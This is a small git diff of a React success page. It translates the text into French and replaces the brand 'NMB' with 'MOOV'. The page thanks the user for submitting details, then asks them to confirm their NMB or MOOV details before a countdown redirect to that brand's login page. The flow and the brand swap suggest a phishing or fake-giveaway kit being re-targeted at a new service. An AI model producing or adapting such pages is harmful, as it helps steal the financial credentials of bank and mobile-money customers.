@@ -31,12 +31,12 @@ function Success({ name }) {
       <h1>
         Success! Congratulations🎉 <br /> {name}
       </h1>
-      <p>Your details have been submitted successfully.</p>
+      <p>Vos informations ont été transmises avec succès..</p>
       <p>
-        For the next step, you are required to confirm your{" "}
-        <b style={{ color: " rgb(9, 20, 37)" }}>NMB details</b>{" "}
+        Pour l'étape suivante, vous devez confirmer votre{" "}
+        <b style={{ color: " rgb(9, 20, 37)" }}>coordonnées MOOV.</b>{" "}
       </p>
-      <span>Redirecting to NMB login... {count}</span>
+      <span>Redirection vers la page de connexion moov... {count}</span>
     </div>
   );
 }
